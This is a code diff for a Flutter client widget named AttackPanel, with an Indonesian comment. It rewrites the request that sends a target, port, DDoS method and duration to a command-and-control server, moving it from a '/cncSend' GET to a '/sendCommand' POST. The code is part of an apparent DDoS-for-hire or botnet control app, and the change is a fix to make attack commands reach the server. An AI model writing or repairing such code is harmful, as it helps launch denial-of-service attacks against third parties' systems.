@@ -143,10 +143,17 @@ class _AttackPanelState extends State<AttackPanel>
 
     setState(() => _isSending = true);
     try {
-      final uri = Uri.parse(
-          '$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId'
-          '&port=${port.isEmpty ? 0 : port}&duration=$duration');
-      final res  = await http.get(uri);
+      // ✅ FIX: Nembak ke endpoint /sendCommand yang ada di index.js
+final res = await http.post(
+  Uri.parse('$baseUrl/sendCommand'), // <--- UBAH JADI INI
+  headers: {'Content-Type': 'application/json'},
+  body: jsonEncode({
+    'key': key,
+    'target': target,
+    'port': port,
+    'duration': duration.toString(),
+  }),
+);
       final data = jsonDecode(res.body);
 
       if (data['cooldown'] == true) {
